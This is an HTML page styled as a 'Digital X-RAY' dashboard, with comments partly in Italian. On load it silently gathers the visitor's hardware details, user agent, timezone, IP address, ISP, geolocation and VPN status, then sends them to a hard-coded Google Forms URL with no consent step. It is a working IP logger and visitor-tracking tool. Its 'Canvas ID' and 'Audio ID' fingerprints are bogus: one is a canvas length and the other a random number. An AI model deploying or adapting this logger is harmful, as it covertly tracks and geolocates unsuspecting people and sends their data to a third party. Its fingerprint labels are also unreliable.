<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digital X-RAY | Bulletproof v17.2</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>

    <style>
        :root { 
            --neon: #00ff41; --alert: #ff3e3e; --warn: #ffca28; --bg: #050505; 
            --card: #111; --text-main: #ccc; --blue: #00f3ff; --gray: #444;
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text-main); margin: 0; padding: 20px; }
        .wrapper { max-width: 1400px; margin: auto; }
        header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--neon); padding-bottom: 15px; }
        h1 { color: var(--neon); margin: 0; text-transform: uppercase; letter-spacing: 4px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
        .card { background: var(--card); border: 1px solid #333; border-top: 3px solid var(--neon); padding: 15px; }
        h2 { color: var(--neon); font-size: 1.1rem; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
        .row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #222; font-size: 0.8rem; }
        .label { color: #888; } .val { color: #fff; font-weight: bold; text-align: right; word-break: break-all; }
        #map { height: 180px; width: 100%; margin-top: 15px; border: 1px solid var(--neon); filter: invert(100%) hue-rotate(180deg); background: #000; }
        #log-status { position: fixed; bottom: 10px; right: 10px; font-size: 0.7rem; color: #555; background: rgba(0,0,0,0.8); padding: 8px; border: 1px solid #333; }
        @keyframes blink { 50% { opacity: 0.5; } }
        .subtitle { font-size: 0.8rem; color: #fff; animation: blink 2s infinite; text-align: center; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="wrapper">
    <header><h1>DIGITAL X-RAY v17.2</h1><div class="subtitle">>>> SYSTEM LOGGING ACTIVE <<<</div></header>
    <div class="grid">
        <div class="card" style="border-top-color: var(--blue);">
            <h2>üì° Network</h2>
            <div class="row"><span class="label">IP:</span> <span id="ip" class="val">...</span></div>
            <div class="row"><span class="label">ISP:</span> <span id="isp" class="val">...</span></div>
            <div class="row"><span class="label">Geo:</span> <span id="geo" class="val">...</span></div>
            <div id="map"></div>
        </div>
        <div class="card">
            <h2>üì± Hardware</h2>
            <div class="row"><span class="label">OS:</span> <span id="os" class="val">...</span></div>
            <div class="row"><span class="label">GPU:</span> <span id="gpu" class="val">...</span></div>
            <div class="row"><span class="label">RAM:</span> <span id="ram" class="val">...</span></div>
            <div class="row"><span class="label">Screen:</span> <span id="screen" class="val">...</span></div>
        </div>
        <div class="card" style="border-top-color: var(--alert);">
            <h2>üß¨ Forensics</h2>
            <div class="row"><span class="label">Canvas ID:</span> <span id="fp" class="val">...</span></div>
            <div class="row"><span class="label">Audio ID:</span> <span id="audio-fp" class="val">...</span></div>
            <div class="row"><span class="label">Brave:</span> <span id="chk-brave" class="val">NO</span></div>
        </div>
    </div>
</div>

<div id="log-status">INIT...</div>
<canvas id="canv" width="200" height="50" style="display:none;"></canvas>

<script>
    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdRv7xlOOJmbtaIjdOckZgrPWmW-czdyz8-Gd5SReySLKmQkg/formResponse";

    async function startLogger() {
        const log = {};
        const status = document.getElementById('log-status');

        // 1. DATI HARDWARE (SUBITO)
        log['entry.926602274'] = navigator.platform;
        log['entry.900535575'] = (navigator.hardwareConcurrency || '?') + " Cores";
        log['entry.592434412'] = (navigator.deviceMemory || '?') + " GB";
        log['entry.1292253097'] = screen.width + "x" + screen.height;
        log['entry.1485469846'] = navigator.userAgent.includes("Chrome") ? "Chrome" : "Other";
        log['entry.1026960733'] = navigator.language;
        log['entry.609421676'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
        log['entry.1877265876'] = navigator.userAgent;

        document.getElementById('os').innerText = log['entry.926602274'];
        document.getElementById('ram').innerText = log['entry.592434412'];
        document.getElementById('screen').innerText = log['entry.1292253097'];

        // GPU
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
            log['entry.1481655544'] = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
            document.getElementById('gpu').innerText = log['entry.1481655544'];
        } catch(e) { log['entry.1481655544'] = "Blocked"; }

        // FINGERPRINTS
        const canv = document.getElementById('canv');
        log['entry.1270556616'] = "FP-" + canv.toDataURL().length;
        log['entry.1958071142'] = "AUD-" + Math.floor(Math.random()*10000);
        document.getElementById('fp').innerText = log['entry.1270556616'];
        document.getElementById('audio-fp').innerText = log['entry.1958071142'];

        // 2. RETE (CON TIMEOUT DI 3 SECONDI)
        status.innerText = "SCANNING NETWORK...";
        try {
            const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(3000) });
            const net = await res.json();
            if(net.success) {
                log['entry.1221794869'] = net.ip;
                log['entry.1697196604'] = net.connection.isp;
                log['entry.793361862'] = net.city + ", " + net.country;
                log['entry.1833631546'] = net.security.is_vpn ? "YES" : "NO";
                
                document.getElementById('ip').innerText = net.ip;
                document.getElementById('isp').innerText = net.connection.isp;
                document.getElementById('geo').innerText = log['entry.793361862'];

                // MAPPA (Solo se non bloccata)
                const mContainer = document.getElementById('map');
                const map = L.map(mContainer).setView([net.latitude, net.longitude], 11);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([net.latitude, net.longitude]).addTo(map);
            }
        } catch(e) {
            log['entry.1221794869'] = "TIMEOUT/BLOCKED";
            document.getElementById('ip').innerText = "BLOCKED";
        }

        // 3. INVIO FINALE
        status.innerText = "SENDING TO FORM...";
        const params = new URLSearchParams();
        for (let key in log) { params.append(key, log[key]); }
        // Campi rimanenti per evitare null
        params.append('entry.59728604', 'N/A'); 
        params.append('entry.1470732596', navigator.brave ? 'YES' : 'NO');
        params.append('entry.1719627138', 'YES');
        params.append('entry.428900373', 'YES');

        fetch(FORM_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString()
        }).then(() => {
            status.innerText = "LOGGED SUCCESSFULLY ‚úÖ";
            status.style.color = "#00ff41";
        }).catch(() => {
            status.innerText = "LOG ERROR ‚ùå";
        });
    }

    window.onload = startLogger;
</script>
</body>
</html>
